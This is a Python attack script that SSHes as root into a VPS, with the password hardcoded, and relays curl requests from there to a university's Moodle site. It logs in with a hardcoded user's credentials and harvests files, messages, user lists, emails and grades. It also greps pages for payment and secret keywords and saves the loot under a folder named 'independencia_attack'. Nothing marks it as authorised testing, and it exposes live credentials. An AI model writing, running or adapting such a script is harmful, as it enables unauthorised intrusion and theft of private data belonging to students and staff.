#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - Moodle deep exploration with aguzmango session"""
import paramiko, json, time, re, sys, io
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="
MOODLE = "https://universidad.findep.mx"

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def safe_print(s, maxlen=2500):
    s = str(s)
    if len(s) > maxlen: s = s[:maxlen] + "...[truncated]"
    try: print(s)
    except: print(repr(s)[:maxlen])

def main():
    print(f"[*] Connecting to VPS...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {}
    cookie_file = "/tmp/moodle_deep_cookies.txt"

    # Login first
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -c {cookie_file} '{MOODLE}/login/index.php' -o /tmp/md_login.html")
    ssh_exec(client, cmd, timeout=20)
    out, _ = ssh_exec(client, "cat /tmp/md_login.html", timeout=10)
    m = re.search(r'name="logintoken"\s+value="([^"]+)"', out)
    token = m.group(1) if m else ""
    cmd = (f"curl -sk -m 25 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} -L "
           f"--data-urlencode 'username=aguzmango' --data-urlencode 'password=Capacita-1' "
           f"--data-urlencode 'logintoken={token}' -o /dev/null '{MOODLE}/login/index.php'")
    ssh_exec(client, cmd, timeout=30)
    print("[+] Logged in as aguzmango")

    # 1. User files
    print("\n[*] === User files ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/md_files.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' '{MOODLE}/user/files.php'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  /user/files.php: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/md_files.html", timeout=10)
    log["user_files_html"] = out
    files = re.findall(r'href="([^"]*pluginfile.php[^"]*)"', out)
    print(f"  Files found: {len(files)}")
    for f in files[:20]:
        print(f"    {f}")
    log["user_files"] = files

    # 2. Messages
    print("\n[*] === Messages ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/md_msgs.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' '{MOODLE}/message/index.php'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  /message/index.php: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/md_msgs.html", timeout=10)
    log["messages_html"] = out[:5000]

    # 3. Notifications
    print("\n[*] === Notifications ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/md_notif.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' '{MOODLE}/message/output/popup/notifications.php'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  /message/output/popup/notifications.php: {out.strip()}")

    # 4. Explore each course for files/resources
    print("\n[*] === Explore courses ===")
    course_ids = [1029, 1063, 1064, 1065, 1071, 1066, 1073, 1074, 1078, 1090, 1143, 603, 756, 1298]
    course_data = {}
    for cid in course_ids[:6]:  # First 6 to be fast
        cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
               f"-o /tmp/md_course_{cid}.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
               f"'{MOODLE}/course/view.php?id={cid}'")
        out, _ = ssh_exec(client, cmd, timeout=20)
        out_body, _ = ssh_exec(client, f"cat /tmp/md_course_{cid}.html", timeout=10)
        # Extract course name
        title_m = re.search(r'<title>([^<]+)</title>', out_body)
        title = title_m.group(1) if title_m else ""
        # Extract resources/files
        resources = re.findall(r'href="([^"]*(?:resource|folder|mod|file)[^"]*)"', out_body)
        course_data[cid] = {"title": title, "size": len(out_body), "resources": list(set(resources))[:20]}
        print(f"  Course {cid}: {title[:80]} | {len(out_body)} bytes | {len(resources)} resources")
        time.sleep(0.5)
    log["courses"] = course_data

    # 5. Try to find other users
    print("\n[*] === User search ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/md_users.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
           f"'{MOODLE}/user/index.php?id=1'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  /user/index.php?id=1: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/md_users.html", timeout=10)
    log["user_list_html"] = out[:5000]
    users = re.findall(r'href="(/user/profile\.php\?id=\d+)"[^>]*>([^<]+)', out)
    print(f"  Users found: {len(users)}")
    for u in users[:20]:
        print(f"    {u[0]} -> {u[1].strip()}")
    log["users"] = users

    # 6. Preferences / settings
    print("\n[*] === User preferences ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/md_prefs.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' '{MOODLE}/user/preferences.php'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  /user/preferences.php: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/md_prefs.html", timeout=10)
    log["preferences_html"] = out[:3000]
    # Look for email
    emails = re.findall(r'[\w.+-]+@[\w.-]+\.\w+', out)
    print(f"  Emails: {emails[:10]}")

    # 7. Site policies
    print("\n[*] === Site info / badges ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/md_site.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' '{MOODLE}/?redirect=0'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    out, _ = ssh_exec(client, "cat /tmp/md_site.html", timeout=10)
    # Extract version
    version_m = re.search(r'moodle\s+version[:\s]+([0-9.]+)', out, re.IGNORECASE)
    if version_m:
        print(f"  Moodle version: {version_m.group(1)}")
    # Look for sensitive keywords
    for kw in ["spei", "stp", "transferencia", "pago", "clave", "cert", "token", "api", "secret"]:
        if kw in out.lower():
            print(f"  Found keyword: {kw}")

    # 8. Check calendar for events
    print("\n[*] === Calendar ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/md_cal.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' '{MOODLE}/calendar/view.php?view=month'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  /calendar/view.php: {out.strip()}")

    # 9. Grade report
    print("\n[*] === Grade report ===")
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-o /tmp/md_grades.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' '{MOODLE}/grade/report/overview/index.php'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    print(f"  /grade/report/overview: {out.strip()}")
    out, _ = ssh_exec(client, "cat /tmp/md_grades.html", timeout=10)
    log["grades_html"] = out[:3000]

    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_moodle_deep.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Deep exploration saved to {out_file}")

    client.close()

if __name__ == "__main__":
    main()
